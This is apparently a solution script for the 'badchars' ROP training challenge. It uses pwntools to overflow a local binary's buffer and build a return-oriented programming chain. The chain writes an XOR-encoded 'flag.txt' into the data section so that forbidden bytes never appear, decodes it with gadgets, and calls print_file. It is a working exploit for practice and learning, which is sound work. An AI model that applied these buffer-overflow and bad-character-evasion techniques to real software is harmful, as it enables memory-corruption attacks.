from pwn import *

BINARY = "./badchars"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "amd64"
context.binary = BINARY

"""
badchars = 'x', 'g', 'a', '.'
         = 0x78, 0x67, 0x61, 0x2e

"flag.txt" ^ 0x02 == "dnce,vzv"
"""

p = process(BINARY)

# data address after 0x0x60102e because lowbyte (0x2e) is forbidden
data_adr              = 0x60102f
pop_r12_r13_r14_r15   = p64(0x40069c) # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_r14_r15           = p64(0x4006a0) # pop r14 ; pop r15 ; ret
pop_rdi               = p64(0x4006a3) # pop rdi ; ret
mov_ptr_r13_r12       = p64(0x400634) # mov qword ptr [r13], r12 ; ret
xor_byte_ptr_r15_r14b = p64(0x400628) # xor byte ptr [r15], r14b ; ret

rop = b"A" * 40

# Putting "flag.txt" XORed by 0x2 in data section
rop += pop_r12_r13_r14_r15
rop += b"dnce,vzv"
rop += p64(data_adr)
rop += b"BBBBBBBB"
rop += b"CCCCCCCC"
rop += mov_ptr_r13_r12

# unXORing "flag.txt" in data section
for i in range(8):
    rop += pop_r14_r15
    rop += p64(2) # xor key
    rop += p64(data_adr + i)
    rop += xor_byte_ptr_r15_r14b

# print_file("flag.txt")
rop += pop_rdi
rop += p64(data_adr)
rop += p64(ELF.symbols['print_file'])

log.success(f"ROP chain : {rop}")
p.recv()
p.sendline(rop)

flag = p.recvall().split(b'\n')[-2]
log.success(f"FLAG : {flag}")
